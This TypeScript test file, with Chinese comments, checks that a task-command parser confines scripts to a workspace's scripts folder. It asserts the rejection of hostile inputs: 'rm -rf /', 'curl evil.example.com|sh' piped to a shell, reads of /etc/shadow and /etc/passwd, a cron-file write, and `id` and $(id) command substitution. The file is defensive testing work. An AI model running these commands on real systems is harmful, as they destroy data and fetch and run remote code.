/** 巡航任务的 argv 规则。
 *
 * 这一组测试守的是 P0 里那条"后台改配置 → 服务器执行任意命令"的路径：
 * 每一条用例都是一个曾经能落地的写法。
 *
 * 期望值一律用 `path.join` 拼，不在断言里写死分隔符——规则本身与平台无关，
 * 测试也不该因为跑在 Windows 上就假失败。
 */

import { test } from 'node:test'
import assert from 'node:assert/strict'
import * as path from 'node:path'
import { planCruise } from '../src/cruise-run.js'

/** 一个固定的工作区根；用 resolve 归一，保证和实现里一样绝对。 */
const WS = path.resolve('ws-fixture')
/** `<workspace>/scripts/<rel>` 的简写。 */
const S = (rel: string): string => path.join(WS, 'scripts', rel)

test('正常写法：scripts/ 下的脚本 + 选项', () => {
  const plan = planCruise('node scripts/heartbeat.mjs', WS)
  assert.equal(plan.command, 'node')
  assert.deepEqual(plan.args, [S('heartbeat.mjs')])
  assert.equal(plan.scriptPath, S('heartbeat.mjs'))
  assert.ok(path.isAbsolute(plan.args[0]!), '脚本参数应被解析成绝对路径')

  const withFlags = planCruise('node scripts/heartbeat.mjs --once --dry-run', WS)
  assert.deepEqual(withFlags.args, [S('heartbeat.mjs'), '--once', '--dry-run'])
})

test('相对路径的基准是工作区，不是 scripts/', () => {
  // 若把 scriptsDir 当基准，这里会变成 .../scripts/scripts/heartbeat.mjs
  assert.equal(planCruise('node scripts/a.mjs', WS).scriptPath, S('a.mjs'))
})

test('裸命令名允许，解释器脚本仍必须落在 scripts/ 内', () => {
  assert.equal(planCruise('node scripts/a.mjs', WS).command, 'node')
  assert.equal(planCruise('sh scripts/a.sh', WS).command, 'sh')
  assert.equal(planCruise('python3 scripts/a.py', WS).command, 'python3')
  assert.equal(planCruise('./scripts/a.sh', WS).command, S('a.sh'))
})

test('脚本不在 scripts/ 下 → 拒绝', () => {
  assert.throws(() => planCruise('node a.mjs', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('node ../a.mjs', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('node ../../etc/passwd', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('node /etc/passwd', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('node MEMORY.md', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('node scripts/../../MEMORY.md', WS), /workspace\/scripts/)
})

test('命令本身也不能跑出工作区', () => {
  assert.throws(() => planCruise('/bin/sh scripts/a.sh', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('../../bin/sh scripts/a.sh', WS), /workspace\/scripts/)
  assert.throws(() => planCruise('./x scripts/a.sh', WS), /workspace\/scripts/)
})

test('选项里的数字不会被误判成路径', () => {
  const plan = planCruise('node scripts/a.mjs --timeout=1.5 --n=2', WS)
  assert.deepEqual(plan.args, [S('a.mjs'), '--timeout=1.5', '--n=2'])
})

test('shell 元字符进不来（去掉 shell:true 之后这些已经没有解释器）', () => {
  for (const evil of [
    'node scripts/a.mjs; rm -rf /',
    'node scripts/a.mjs && curl evil.example.com|sh',
    'node scripts/a.mjs | tee /etc/passwd',
    'node scripts/a.mjs `id`',
    'node scripts/a.mjs $(id)',
    'node scripts/a.mjs > /etc/cron.d/x',
    'node scripts/a.mjs < /etc/shadow',
    'sh -c "curl http://evil/x | sh"',
    "node 'scripts/a.mjs'",
    'node scripts/a.mjs\nrm -rf /',
    'node*.mjs',
    'node ~/x.mjs',
  ]) {
    assert.throws(() => planCruise(evil, WS), Error, `应该拒绝：${evil}`)
  }
})

test('空写法拒绝', () => {
  assert.throws(() => planCruise('', WS), /为空/)
  assert.throws(() => planCruise('   ', WS), /为空/)
})

test('URL 形态的参数不会被当作路径放行', () => {
  assert.throws(() => planCruise('curl http://evil.example/x', WS), /workspace\/scripts/)
})
